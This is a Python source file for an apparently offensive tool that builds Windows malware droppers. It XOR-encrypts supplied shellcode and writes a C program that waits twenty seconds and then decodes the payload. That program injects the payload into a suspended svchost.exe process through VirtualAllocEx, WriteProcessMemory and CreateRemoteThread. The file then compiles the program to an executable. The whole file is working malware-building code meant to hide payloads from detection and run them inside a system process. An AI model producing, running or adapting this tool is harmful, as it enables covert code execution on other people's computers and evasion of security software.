import os
import sys
import argparse
import itertools
import secrets

BANNER =  """.d8888b.  888               888 888 8888888b.  8888888b.   .d88888b.  8888888b.
d88P  Y88b 888               888 888 888  "Y88b 888   Y88b d88P" "Y88b 888   Y88b
Y88b.      888               888 888 888    888 888    888 888     888 888    888
 "Y888b.   88888b.   .d88b.  888 888 888    888 888   d88P 888     888 888   d88P
    "Y88b. 888 "88b d8P  Y8b 888 888 888    888 8888888P"  888     888 8888888P"
      "888 888  888 88888888 888 888 888    888 888 T88b   888     888 888
Y88b  d88P 888  888 Y8b.     888 888 888  .d88P 888  T88b  Y88b. .d88P 888
 "Y8888P"  888  888  "Y8888  888 888 8888888P"  888   T88b  "Y88888P"  888"""


def write_code(filename, content):
    """Writes the generated code to the given filename."""

    print("Writing code to '{}'...".format(filename));
    with open(filename, 'w') as f:
        f.write(content)
    print("Writing done!")


def invoke_compiler(src_file, dst_file):
    """Compiles the previously compiled code to a .exe binary."""
    print("Compiling '{}' to '{}'...".format(src_file, dst_file))
    res = os.system("i686-w64-mingw32-gcc '{}' -o '{}' -s -O2".format(src_file, dst_file))
    if res == 0:
        print("Compiled successfully!")
    else:
        print("Error encountered while compiling.")
        sys.exit(-3)
    return res


def remove_code(filename):
    """Removes the temporary .c file."""
    os.remove(filename)


def encode_bytes_to_hex(data):
    """Encodes a given byte array to a hex string (\\x90\\x0A...)"""
    return "".join(map(lambda x: "\\x{0:0>2x}".format(x), data))


def encode_shellcode(key, shellcode):
    """Encrypts the shellcode with the given key.  All arguments are expected to be bytes."""
    encoded_bytes = [a ^ b for a, b in list(zip(shellcode, itertools.cycle(key)))]
    return encode_bytes_to_hex(encoded_bytes)


def load_bin_file(filename):
    """Loads a raw .bin file containing shellcode."""
    print("Loading code from file '{}'...".format(filename))
    with open(filename, 'rb') as f:
        return f.read()


def generate_code(shellcode, key):
    """Generates the C++ code where the payload will be set."""

    # Calculates the actual length of the shellcode and the key.  There will always be 4 bytes received for every actual byte in the payload.
    shellcode_length = int(len(shellcode) / 4)
    key_length = int(len(key) / 4)

    return f"""
    #include <stdio.h>
    #include <string.h>
    #include <processthreadsapi.h>
    #include <windows.h>
    #include <conio.h>

    const char shellcode[] = "{shellcode}";
    const char key[] = "{key}";
    char decoded_shellcode[{shellcode_length}];

    char* decode() {{
        for(int i = 0; i < {shellcode_length}; i++) {{
            decoded_shellcode[i] = shellcode[i] ^ key[i % {key_length}];
        }}

        return decoded_shellcode;
    }}

    BOOL spawn_process() {{
        STARTUPINFO si = {{0}};
        PROCESS_INFORMATION pi = {{0}};

        si.cb = sizeof(si);
        BOOL creationResult = CreateProcess("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

        if(creationResult == TRUE) {{
            //printf("New PID: %d\\n", pi.dwProcessId);
            //printf("Thread ID: %d\\n", pi.dwThreadId);

            PVOID remoteBuff = VirtualAllocEx(pi.hProcess, NULL, {shellcode_length}, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
            WriteProcessMemory(pi.hProcess, remoteBuff, decoded_shellcode, {shellcode_length}, NULL);
            HANDLE remoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);

            getch();

            CloseHandle(pi.hProcess);
        }}
        else {{
            printf("Error!");
            exit(-1);
        }}

        return creationResult;
    }}

    int main() {{
        Sleep(20000);
        char* decoded_shellcode = decode();
        spawn_process();
        // For debugging purposes.
        //printf("Decoded: '%s'\\n", decoded_shellcode);
        //printf("Shellcode: %s\\n", shellcode);
        return 0;
    }}
"""


def generate_random_key(length):
    """Generates a random string of length X."""
    return secrets.token_bytes(length)


def convert_hex_string_to_bytes(string):
    """Converts an hex string (\x00\x00) to its actual bytearray representation."""
    mid = string.replace('\\x', '')
    return bytearray.fromhex(mid)


def main():

    # Prints the tool's banner.
    print(BANNER)

    # Arguments parser.
    parser = argparse.ArgumentParser(description="Generates droppers with an encrypted payload.")
    parser.add_argument('-o', '--output-file', default="poc", help='Name of the file to which the executable should be written.')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increases verbosity.')

    key_group = parser.add_mutually_exclusive_group()
    key_group.add_argument('--key-random', action='store_true', help="Generates a random string of bytes of the same size as the shellcode to encrypt the payload.")
    key_group.add_argument('--key-hex', help="Hex key to use in order to encrypt/decrypt the payload. (\\x0A\\x90\\x00...)")
    key_group.add_argument('--key-ascii', help="ASCII key to use in order to encrypt/decrypt the payload. ('secret_key')")

    source_group = parser.add_mutually_exclusive_group()
    source_group.add_argument('-sf', '--source-bin-file', help="Source file from which the shellcode should be loaded.  This is expected to be a raw file.")
    source_group.add_argument('-ss', '--source-hex-string', help="Hex string from which the payload should be provisioned. Ex: \\x90\\x65\\x23...")

    args = parser.parse_args()

    # Acquires the shellcode from one of the given sources.
    shellcode = None
    if args.source_bin_file:
        shellcode = load_bin_file(args.source_bin_file)
    elif args.source_hex_string:
        shellcode = convert_hex_string_to_bytes(args.source_hex_string)
    else:
        print("Error: either the -sf or the -ss option needs to be provided.")
        sys.exit(-2)

    if args.verbose:
        print("Shellcode: {}".format(shellcode))
        print("Length of the shellcode: {}".format(len(shellcode)))

    # Acquires the encryption key from one of the given sources.
    key = None
    if args.key_random:
        key = generate_random_key(len(shellcode))
    elif args.key_hex:
        key = convert_hex_string_to_bytes(args.key_hex)
    elif args.key_ascii:
        key = args.key_ascii.encode('ascii')
    else:
        print("Error: either the --key or the --random-key needs to be provided.")
        sys.exit(-1)

    if args.verbose:
        print("Length of the key: {}".format(len(key)))

    # Encrypts the shellcode with the given key.
    hex_encrypted_shellcode = encode_shellcode(key, shellcode)

    # Ensures we have a hex key to set in our C++ Code.
    hex_key = encode_bytes_to_hex(key)

    if args.verbose:
        print("Encrypted shellcode:")
        print(hex_encrypted_shellcode)

    # Generates the C++ code.
    generated_code = generate_code(hex_encrypted_shellcode, hex_key)

    # Creates our file names.
    c_file = "{}.c".format(args.output_file)
    exe_file = "{}.exe".format(args.output_file)

    # Writes the code to the .c file.
    write_code(c_file, generated_code)

    # Compiles the .c file to an executable.
    invoke_compiler(c_file, exe_file)

    # If we are not in verbose mode, we remove the temporary .c file.
    if not args.verbose:
        remove_code(c_file)




if __name__ == "__main__":
    main()
